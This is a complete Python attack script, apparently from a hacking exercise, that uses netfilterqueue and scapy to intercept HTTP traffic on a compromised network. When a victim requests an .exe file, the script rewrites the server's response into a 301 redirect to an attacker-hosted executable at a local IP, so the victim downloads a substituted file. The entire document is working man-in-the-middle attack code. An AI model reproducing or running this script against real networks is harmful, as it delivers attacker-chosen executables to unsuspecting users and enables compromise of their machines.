#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

def set_packet(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        if scapy_packet[scapy.TCP].dport == 80:  # Outgoing HTTP request
            print("[+] HTTP packet being sent...")
            if b".exe" in scapy_packet[scapy.Raw].load:  # Keep load as bytes
                print("[+] exe request found...")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:  # Incoming HTTP response
            print("[+] HTTP packet being received...")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file...")
                modified_packet = set_packet(
                    scapy_packet,
                    b"HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.119.139/test.exe\n\n"
                )  # Make sure this is bytes
                packet.set_payload(bytes(modified_packet))  # Convert to bytes

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()